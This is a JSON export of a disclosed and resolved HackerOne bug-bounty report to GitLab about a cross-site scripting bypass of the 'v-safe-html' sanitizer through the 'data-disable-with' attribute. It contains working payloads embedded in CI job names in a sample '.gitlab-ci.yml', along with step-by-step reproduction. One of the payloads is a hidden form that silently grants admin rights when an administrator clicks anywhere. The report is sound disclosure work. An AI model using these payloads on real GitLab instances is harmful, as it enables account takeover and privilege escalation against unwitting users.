{
  "id": 1579645,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTc5NjQ1",
  "url": "https://hackerone.com/reports/1579645",
  "title": "XSS: `v-safe-html` is not safe enough",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2022-05-24T10:29:44.813Z",
  "submitted_at": "2022-05-24T10:29:44.956Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "yvvdwf",
    "url": "/yvvdwf",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/ubqmt760dugarh527x4qc4mkdn4n/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
    },
    "is_me?": false,
    "cleared": false,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 264,
    "url": "https://hackerone.com/gitlab",
    "handle": "gitlab",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "GitLab",
      "twitter_handle": "gitlab",
      "website": "https://about.gitlab.com",
      "about": "A single application for the entire software development lifecycle."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2022-11-16T01:08:16.508Z",
  "bug_reporter_agreed_on_going_public_at": "2022-11-04T16:53:01.128Z",
  "team_member_agreed_on_going_public_at": "2022-11-16T01:08:16.353Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "`v-safe-html` directive uses Dompurify [to remove](https://gitlab.com/gitlab-org/gitlab-ui/-/blob/9f1bcb1f7392d4d6d072f10197c2aab2c29c3287/src/directives/safe_html/constants.js#L3)  `data-remote', 'data-url', 'data-type', 'data-method'` attributes from HTML tags. Rails-js relies on another attribute, [`data-disable-with`](https://github.com/rails/rails/blob/v6.1.4.7/actionview/app/assets/javascripts/rails-ujs.coffee#L10) to [show a HTML content](https://github.com/rails/rails/blob/v6.1.4.7/actionview/app/assets/javascripts/rails-ujs/features/disable.coffee#L41) when an user clicks on a disabled link.\n\nFor example, the following text will bypass the sanitization and popup an alert when an user clicks on the link (which is a transparent topmost layer since the sanitization allows also `style` and `class` attributes):\n\n```html\n<a class=\"fixed-top fixed-bottom text-hide gl-font-size-42 cursor-default\" href=# data-disable-with=\"<img src=x onerror=alert(document.domain)>\">'\n```\n\nAn exploitation can be done via [jobs' error messages](https://gitlab.com/gitlab-org/gitlab/-/blob/38af35c2a4aa666f914484d3f119b813651a2041/app/assets/javascripts/jobs/components/job_app.vue#L215) which contain [CI job names](https://gitlab.com/gitlab-org/gitlab/-/blob/7f86b5b78c107f7124b54e1f797099741765b3d2/app/serializers/build_details_entity.rb#L154) which are provided by users.\n\n\n\n### Steps to reproduce\n\n1. In an existing project or create a new one, add `.gitlab.ci` file with the following content:\n\n```yaml\n'1. XSS when no CSP<a class=\"fixed-top fixed-bottom text-hide gl-font-size-42 cursor-default\" href=# data-disable-with=\"<img src=x onerror=alert(document.domain)>\">':\n  stage: build\n  script: echo \"hi\"\n\n'2. Admin escalation when having CSP<form action=/api/v4/users/5212593?_method=PUT&admin=true method=post><input type=submit class=\"fixed-top fixed-bottom text-hide cursor-default\" style=\"font-size:10000px\" value=Submit>':\n  stage: build\n  script: echo \"hi\"\n\ntrigger-xss:\n  stage: test\n  script: echo \"hi\"\n  dependencies:\n    - '1. XSS when no CSP<a class=\"fixed-top fixed-bottom text-hide gl-font-size-42 cursor-default\" href=# data-disable-with=\"<img src=x onerror=alert(document.domain)>\">'\n    - '2. Admin escalation when having CSP<form action=/api/v4/users/5212593?_method=PUT&admin=true method=post><input type=submit class=\"fixed-top fixed-bottom text-hide cursor-default\" style=\"font-size:10000px\" value=Submit>'\n```\n\n2. Go to `CI/CD`/`Jobs` tab and wait for the CI jobs finished\n\n3. If you are testing on a local instance without CSP protection, click on detail of the job `1. XSS when no CSP<a class=\"fixed-top fixed-bottom text-hide gl-font-size-42 cursor-default\" href=# data-disable-with=\"<img src=x onerror=alert(document.domain)>\">`, then click on the trash button on the right literal bar to `Erase job logs and artifacts`.\n\n3. Go back to the job list, click on `trigger-xss` link to view the detail of this job. Then click on `Retry` button on the right literal bar to retry the job.\n\n4. An error message appears: `This job could not start because it could not retrieve the needed artifacts: 1. XSS when no CSP`. Click anywher to trigger the alert\n\nNote: on gitlab.com or an instance having CSP protection (with `strict-dynamic` value of `script-src`), the inline script, such as `onerror` or the [`<iframe srcdoc='<script src=https://gitlab.com/yvvdwf/data/-/jobs/552156057/artifacts/raw/alert.js></script>'></iframe>`](https://gitlab.com/gitlab-org/gitlab/-/issues/233473), will be prevented to trigger. In such a case, we may use `<form>` tag to trigger arbitrary API requests on behalf of the user, for example, this allows escalate to admin permission when administrator *click anywhere* `2. Admin escalation when having CSP<form action=/api/v4/users/5212593?_method=PUT&admin=true method=post><input type=submit class=\"fixed-top fixed-bottom text-hide cursor-default\" style=\"font-size:10000px\" value=Submit>`\n\n### Impact\n\nXSS allow attackers to perform arbitrary actions on behalf of victims at client side.\n\n### Examples\n\nhttps://gitlab.com/yvvdwf/xss-in-job-dependencies/-/jobs/2498306483\n\nhttps://gitlab.com/yvvdwf/xss-in-job-dependencies/-/jobs/2498287882\n\n### Output of checks\n\nThis bug happens on GitLab.com\n\n## Impact\n\nXSS allow attackers to perform arbitrary actions on behalf of victims at client side.",
  "weakness": {
    "id": 60,
    "name": "Cross-site Scripting (XSS) - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 40,
  "voters": [
    "jumpydata",
    "shreyaschavhan",
    "ra5h",
    "n1m0",
    "infected_tn",
    "zy9ard3",
    "0xdln",
    "address_below0",
    "sudi",
    "f_m",
    "and 30 more..."
  ],
  "severity": {
    "rating": "high",
    "score": 7.3,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "low",
      "user_interaction": "required",
      "scope": "unchanged",
      "confidentiality": "high",
      "integrity": "high",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 18138,
    "asset_type": "URL",
    "asset_identifier": "gitlab.com",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
